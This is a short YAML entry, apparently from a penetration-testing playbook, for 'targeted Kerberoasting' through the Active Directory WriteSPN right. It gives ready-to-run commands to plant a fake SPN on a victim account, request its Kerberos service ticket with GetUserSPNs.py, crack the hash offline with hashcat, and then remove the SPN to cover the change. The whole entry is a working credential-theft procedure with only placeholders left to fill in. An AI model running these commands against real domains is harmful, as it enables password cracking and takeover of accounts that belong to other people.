name: WriteSPN
description: WriteSPN allows setting SPN on target for targeted Kerberoasting
commands:
- '# Set SPN on target user'
- setspn -a HTTP/fakeserver.<DOMAIN> <TARGET_USER>
- ''
- '# Request TGS for the target'
- GetUserSPNs.py -request -dc-ip <DC_IP> '<DOMAIN>/<USER>:<PASSWORD>' -request-user <TARGET_USER>
- ''
- '# Crack the hash'
- hashcat -m 13100 hash.txt wordlist.txt
- ''
- '# Clean up (remove SPN)'
- setspn -d HTTP/fakeserver.<DOMAIN> <TARGET_USER>
opsec: []
references: []
